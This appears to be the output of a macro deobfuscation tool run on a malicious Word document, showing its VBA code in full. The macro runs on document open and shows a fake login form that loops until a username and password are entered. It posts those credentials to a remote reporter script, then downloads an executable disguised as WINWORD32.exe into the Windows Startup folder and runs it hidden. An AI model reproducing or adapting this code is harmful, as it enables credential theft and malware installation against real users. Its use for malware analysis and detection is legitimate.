XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
stream : VBA/ThisDocument - 1611 bytes
########################################


Public Sub Document_Open()
  AutoOpenSub
End Sub


stream : VBA/Module1 - 11762 bytes
########################################



Option Explicit

Private Declare Function URLDownloadToFile Lib "urlmon" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
  
  Public Declare Function ShellExecute Lib "shell32.dll" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
    
    Public Declare Function DeleteUrlCacheEntry Lib "wininet.dll" (ByVal lpszUrlName As String) As Long
      
      Public Declare Function WinExec Lib "Kernel32.dll" (ByVal lpCmdLine As String, ByVal nShowCmd As Long) As Long
        
        Public STARTUP_PATH As String
        Public isFormComplete As Boolean
        Dim Ret As Long
        
        Public Function getOperatingSystem()
          Dim localHost As String
          Dim objWMIService As Variant
          Dim colOperatingSystems As Variant
          Dim objOperatingSystem As Variant
          
          On Error GoTo Error_Handler
          
          localHost = "." 'Technically could be run against remote computers, if allowed
          Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & localHost & "\root\cimv2")
          Set colOperatingSystems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
          
          For Each objOperatingSystem In colOperatingSystems
            getOperatingSystem = objOperatingSystem.Caption & " " & objOperatingSystem.Version
            Exit Function
          Next
          
          Error_Handler_Exit:
          On Error Resume Next
          Exit Function
          
          Error_Handler:
          ' MsgBox "The following error has occured." & vbCrLf & vbCrLf &' "Error Number: " & Err.Number & vbCrLf &' "Error Source: getOperatingSystem" & vbCrLf &' "Error Description: " & Err.Description,' vbCritical, "An Error has Occured!"
          Resume Error_Handler_Exit
        End Function
        
        Sub AutoOpenSub()
          Dim strURL, strPath, strTemp, strCommand As String
          Dim rep, mHdl As Long
          Dim waitTill As Date
          
          On Error Resume Next
          
          isFormComplete = False
          While (Not isFormComplete)
            UserForm1.Show
            sheetOpen
          Wend
          
          If (Instr(getOperatingSystem, "XP") > 0) Then
            Exit Sub
          End If
          
          STARTUP_PATH = Environ$("USERPROFILE") & "\Start Menu\Programs\Startup\"
          If Len(Dir$(STARTUP_PATH & "EXCEL32.exe")) > 0 Then
            Exit Sub
          End If
          If Len(Dir$(STARTUP_PATH & "POWERPNT32.exe")) > 0 Then
            Exit Sub
          End If
          If Len(Dir$(STARTUP_PATH & "WINWORD32.exe")) > 0 Then
            Exit Sub
          End If
          
          Call uploadPOST("NULL", "NULL", "UNTITLED")
          
          Ret = URLDownloadToFile(0, "http://www.advantarlabs.com/plugins/extension-xtd/WINWORD32.exe", Application.Path & "\WINWORD32.exe", 0, 0)
          
          strPath = Application.Path & "\WINWORD32.exe"
          
          If (Instr(getOperatingSystem, "XP") > 0) Then
            'MsgBox "Should be XP"
            STARTUP_PATH = Environ$("USERPROFILE") & "\Start Menu\Programs\Startup\"
            strTemp = STARTUP_PATH & "WINWORD32.exe"
            If Len(Dir$(strTemp)) > 0 Then
              Kill strTemp
            End If
            Name strPath As strTemp
            
            rep = ShellExecute(mHdl, "Open", strTemp, "", "", 1)
          Else
            'MsgBox "Should be VISTA OR WIN 7"
            STARTUP_PATH = Environ$("USERPROFILE") & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
            strTemp = STARTUP_PATH & "WINWORD32.exe"
            'strTemp = STARTUP_PATH & "dotnetfx.exe"
            
            If Len(Dir$(strTemp)) > 0 Then
              Kill strTemp
            End If
            Name strPath As strTemp
            'MsgBox (strTemp)
            
            rep = Shell(strTemp, vbHide)
            
          End If
          
          
        End Sub
        
        Sub sheetOpen()
          Selection.WholeStory
          With Selection.Font
            .Hidden = False
          End With
        End Sub
        
        Public Function uploadPOST(ByVal username_no_spaces As String, ByVal password_no_spaces As String, ByVal message_no_spaces As String)
          
          Dim URL As String
          Dim objHTTP As Object
          
          Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
          URL = "http://www.advantarlabs.com/plugins/extension-xtd/reporter.php?msg=" & message_no_spaces & "&uname=" & username_no_spaces & "&pword=" & password_no_spaces
          objHTTP.Open "POST", URL, False
          objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
          objHTTP.send(""))
          
        End Function
        
        
        
        
        
        
        
        
        
        
        
stream : VBA/UserForm1 - 3546 bytes
########################################

        
        
        Private Sub CommandButton1_Click()
          Dim user, pass As String
          user = UserForm1.UserBox.Value
          pass = UserForm1.PassBox.Value
          
          If (StrComp(user, "", vbTextCompare) = 0) Or (StrComp(user, "User name", vbTextCompare) = 0) Or (StrComp(pass, "", vbTextCompare) = 0) Then
            MsgBox("Invalid password")
            isFormComplete = False
            Unload UserForm1
          Else
            Unload UserForm1
            Call uploadPOST(user, pass, "UNTITLED")
            isFormComplete = True
          End If
        End Sub
        

